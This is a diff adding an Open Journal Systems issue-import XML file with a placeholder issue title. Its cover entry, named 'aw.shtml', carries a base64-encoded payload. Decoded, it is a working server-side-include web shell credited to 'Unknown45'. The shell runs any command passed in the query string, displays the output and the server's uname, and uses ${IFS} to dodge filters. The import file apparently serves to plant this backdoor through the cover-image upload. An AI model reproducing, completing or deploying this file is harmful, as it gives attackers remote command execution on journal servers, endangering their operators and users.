@@ -1,0 +1,29 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<issues xmlns="http://pkp.sfu.ca"
+        xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
+        xsi:schemaLocation="http://pkp.sfu.ca http://pkp.sfu.ca/ojs/schema/native.xsd">
+        
+  <issue published="1" current="1" access_status="1">
+    <description locale="en_US">&lt;p&gt;Issue description&lt;/p&gt;</description>
+    <issue_identification>
+      <volume>01</volume>
+      <number>112</number>
+      <year>2025</year>
+      <title locale="en_US">sssssssssssasafsfsss</title>
+    </issue_identification>
+    <last_modified>2025-09-18</last_modified>
+
+    <!-- PERBAIKAN: cover dibungkus dengan covers -->
+    <covers>
+      <cover locale="en_US">
+        <cover_image>aw.shtml</cover_image>
+        <cover_image_alt_text>Issue Cover</cover_image_alt_text>
+        <embed encoding="base64">PCEtLSBBdXRob3IgOiBVbmtub3duNDUgLS0+CjwhLS0gaGFyZ2FpIGF1dGhvciBkZW5nYW4gY2FyYSBtZW5nZ3VuYWthbiBzY3JpcHQgaW5pIHRhbnBhIG1lbmdyZWNvZGUgc2NyaXB0IGluaSAhISEgLS0+Cgo8IS0tI2NvbmZpZyBlcnJtc2c9IltFcnJvciBpbiBzaGVsbF0iLS0+CjwhLS0jc2V0IHZhcj0iemVybyIgdmFsdWU9IiIgLS0+CjwhLS0jaWYgZXhwcj0iJFFVRVJZX1NUUklOR19VTkVTQ0FQRUQgPSBcJHplcm8iIC0tPgo8IS0tI3NldCB2YXI9InNobCIgdmFsdWU9Indob2FtaSIgLS0+CjwhLS0jZWxzZSAtLT4KPCEtLSNzZXQgdmFyPSJzaGwiIHZhbHVlPSRRVUVSWV9TVFJJTkdfVU5FU0NBUEVEIC0tPgo8IS0tI2VuZGlmIC0tPgo8aHRtbD4KPGhlYWQ+Cjx0aXRsZT5TU0kgQ29tbWFuZCBCeXBhc3M8L3RpdGxlPgo8c2NyaXB0IHNyYz0iaHR0cHM6Ly9hamF4Lmdvb2dsZWFwaXMuY29tL2FqYXgvbGlicy9qcXVlcnkvMi4xLjEvanF1ZXJ5Lm1pbi5qcyI+PC9zY3JpcHQ+CjxzY3JpcHQgbGFuZ3VhZ2U9ImphdmFzY3JpcHQiPgpmdW5jdGlvbiBmZXgoKQp7Cgl2YXIgdXJpID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2NvbW1hbmQnKS52YWx1ZTsKCXZhciByZXAgPSB1cmkucmVwbGFjZSgvWyBdL2csJyR7SUZTfScpOwoJdmFyIHJlcyA9IGVuY29kZVVSSSh1cmkpOwoJZG9jdW1lbnQubG9jYXRpb24uaHJlZj0iPCEtLSNlY2hvIHZhcj1ET0NVTUVOVF9OQU1FIC0tPj8iK2VuY29kZVVSSShyZXApOwp9Cjwvc2NyaXB0Pgo8c2NyaXB0Pgpkb2N1bWVudC5vbmtleWRvd24gPSBrZXlkb3duOwpmdW5jdGlvbiBrZXlkb3duKGUpIHsKICAgIGlmICghZSkgZSA9IGV2ZW50OwogICAgaWYgKGUua2V5Q29kZSA9PT0gMTMpIHsKICAgIAl2YXIgdXJpID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2NvbW1hbmQnKS52YWx1ZTsKICAgIAl2YXIgcmVwID0gdXJpLnJlcGxhY2UoL1sgXS9nLCcke0lGU30nKTsKCQl2YXIgcmVzID0gZW5jb2RlVVJJKHVyaSk7CiAgICAgICAgZG9jdW1lbnQubG9jYXRpb24uaHJlZj0iPCEtLSNlY2hvIHZhcj1ET0NVTUVOVF9OQU1FIC0tPj8iK2VuY29kZVVSSShyZXApOwoKICAgIH0KfQo8L3NjcmlwdD4KCjwvaGVhZD4KPGJvZHk+Cjxmb250IGZhY2U9Y291cmllciBzaXplPTI+PGk+cGhwIGVuZ2luZSBkaXNhYmxlIGJ5cGFzcyBieSB1bmtub3duNDUgfCBzZXJ2ZXIgOiA8Zm9udCBjb2xvcj1ncmVlbj48IS0tI2V4ZWMgY21kPSJ7dW5hbWUsLW5yfSIgLS0+PC9mb250Pjxicj4KPGZvbnQgc2l6ZT0yPkNvbW1hbmQgOiA8aW5wdXQgdHlwZT10ZXh0IHNpemU9NjAgaWQ9Y29tbWFuZCBjbGFzcz0idGV4dCIgbmFtZT0iYWRkcmVzczEiIHN0eWxlPSJtYXgtd2lkdGg6IDEwMCU7IG1heC1oZWlnaHQ6IDEwMCU7Ij4mbmJzcDs8aW5wdXQgdHlwZT1idXR0b24gdmFsdWU9RXhlY3V0ZSBvbmNsaWNrPSJmZXgoKTsiPgo8aHI+CkV4ZWN1dGVkIENvbW1hbmQgOiA8L2ZvbnQ+PGI+PCEtLSNlY2hvIHZhcj1zaGwgLS0+PC9iPjxicj4KPHRleHRhcmVhIGJnY29sb3I9I2U0ZTBkOCBjb2xzPTEyMSByb3dzPTE1Pgo8IS0tI2V4ZWMgY21kPSRzaGwgLS0+CjwvdGV4dGFyZWE+CjxzY3JpcHQ+Ci8vJCgnYm9keScpLm9uKCdpbnB1dCcsICdpbnB1dFtuYW1lPWFkZHJlc3MxXScsIGZ1bmN0aW9uKCkgewovLyAgJCh0aGlzKS52YWwoJCh0aGlzKS52YWwoKS5yZXBsYWNlKCcgJywgJyR7SUZTfScpKTsKLy99KTsKPC9zY3JpcHQ+Cjxocj4KPGNlbnRlcj4KCTxmb250IGZhY2U9ImNvdXJpZXIiIHNpemU9Mj5Vbmtub3duNDU8YnI+PGEgaHJlZj0iaHR0cHM6Ly9leHBsb2l0cy5teS5pZCIgdGFyZ2V0PSJfYmxhbmsiPmh0dHBzOi8vZXhwbG9pdHMubXkuaWQ8L2E+PC9mb250PjwvY2VudGVyPgo8L2JvZHk+CjwvaHRtbD4=
+</embed>
+      </cover>
+    </covers>
+
+    <issue_galleys/>
+    <articles/>
+  </issue>
+</issues>
